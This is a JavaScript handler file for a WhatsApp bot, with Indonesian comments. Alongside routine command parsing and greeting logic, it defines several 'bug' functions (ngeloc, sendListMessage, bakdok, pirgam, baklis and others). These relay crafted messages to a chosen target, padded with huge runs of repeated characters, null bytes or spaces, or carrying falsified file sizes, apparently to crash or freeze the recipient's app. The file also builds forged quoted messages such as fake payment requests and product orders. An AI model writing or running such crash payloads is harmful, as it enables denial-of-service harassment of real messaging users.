module.exports = async (anggazyy, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await anggazyy.decodeJid(anggazyy.user.id)
const sender = m.key.fromMe ? (anggazyy.user.id.split(':')[0]+'@s.whatsapp.net' || anggazyy.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await anggazyy.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { mediafireDl } = require('./all/database/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const { ios } = require("./virtex/ios.js")
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return anggazyy.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold(namabot), color(`[ PESAN ]`, `white`), color(`FROM`, `red`), color(`${pushname}`, `white`), color(`Text :`, `red`), color(`${body}`, `white`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        
// Read Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
////////// AREA CONST BUG BY ANGGAZYYYYYYYYY ///////////
const xbug2 = {

key: {

remoteJid: 'status@broadcast',

fromMe: false, 

participant: '0@s.whatsapp.net'

},

message: {

listResponseMessage: {

title: 'RLZCMODS'

}

}

}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍REALYBUGZ╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}




//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍REALYBUGZ╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "RLZCMODSV1 - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://whatsapp.com/channel/0029VaiSVyLEQIam3mgpCD2I",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - RLZCMODSV1`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - DevilS',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` RLZCMODS - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}



const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ RLZCMODS ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ RLZCMODS ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}
/////// ENDINGGG ------------- BY ZiroooMD 
// ini vcard kalo di edit bakal error jangan kau edit.
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await anggazyy.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await anggazyy.getName(i + '@s.whatsapp.net')}\n
FN:${await anggazyy.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:hehe@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VaiSVyLEQIam3mgpCD2I
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await anggazyy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

/// FUNCTION BUG 
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍REALYBUGZ╮⭑ ☠️⃰͜͡؜Sakzx⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    anggazyy.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await anggazyy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await anggazyy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return anggazyy.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return anggazyy.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

//=================================================//
async function aipong(target) {
await anggazyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍REALYBUGZ╮⭑ ☠️⃰͜͡؜SAKZX⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

//Status
if (!anggazyy.public) {
if (!m.key.fromMe) return
} 

//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰RLZCMODS 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1d05143d785a098208622.jpg" } }, { upload: anggazyy.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #RLZCMODSV1"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒RLZCMODSV1 666 !!!ᥫ᭡▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ☠️..."
]
let { key } = await anggazyy.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await anggazyy.sendMessage(from, {text: xeonlod[i], edit: key });
}
}
        
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ REALYBUGZ ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍RLZCMODS╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍RLZCMODS╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
anggazyy.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
anggazyy.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "FAXZ-BOTz v1.9", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://telegra.ph/file/1d05143d785a098208622.jpg", 
"sourceUrl": "https://whatsapp.com/channel/0029VaiSVyLEQIam3mgpCD2I" }}}, { quoted: m }) }

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

